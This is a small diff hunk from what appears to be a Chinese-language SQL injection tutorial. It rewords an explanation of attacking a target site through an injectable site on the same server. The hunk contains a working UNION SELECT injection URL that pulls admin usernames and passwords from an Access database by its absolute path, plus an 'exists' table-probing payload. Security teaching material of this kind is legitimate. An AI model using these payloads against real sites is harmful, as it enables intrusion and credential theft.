@@ -161,9 +161,9 @@ id=1 and exsits (select admin from admin)
 
 - 绝对路径：D:/wwwroot/...\*.mdb、\*.asa、\*.asp
 
-- 举例：
+- 举例：a是目标站点，b是存在注入的站点，a、b是同服务器的站点。
 
-a是目标站点，b是存在注入的站点，a、b是同服务器的站点。admin为表名，username、password为admin表的段：  
+攻击链接示例如下，其中admin为表名，username、password为admin表的段。  
 
 ```
 http://xxx.com/news/type.asp?id=1 and 1=2 union select 1,2,username,4,5,6 from [D:\wwwroot\1\Databases\xycms.mdb].admin
